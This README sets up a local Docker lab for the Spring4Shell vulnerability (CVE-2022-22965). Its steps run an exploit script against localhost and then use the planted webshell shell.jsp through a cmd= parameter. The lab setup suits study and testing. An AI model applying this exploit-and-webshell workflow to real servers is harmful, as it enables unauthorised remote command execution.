# Spring4Shell CVE-2022-22965

## Requirements

1. Docker
2. Python3

## Instructions

1. Clone the repository
2. Build Docker Image: `docker build . -t spring4shell`
3. Run Docker:'Build and run the container:`docker run -p 8080:8080 spring4shell`
4. Open http://localhost:8080/helloworld/greeting
5. Run the exploit.py:`python3 exploit.py --url "http://localhost:8080/helloworld/greeting"`
6. Visit the created webshell! Modify the `cmd=xx` for your commands.(`http://localhost:8080/shell.jsp`)

![WebPage](screen/01.png?raw=true)
![WebPage](screen/02.png?raw=true)
![WebPage](screen/03.png?raw=true)
![WebPage](screen/04.png?raw=true)
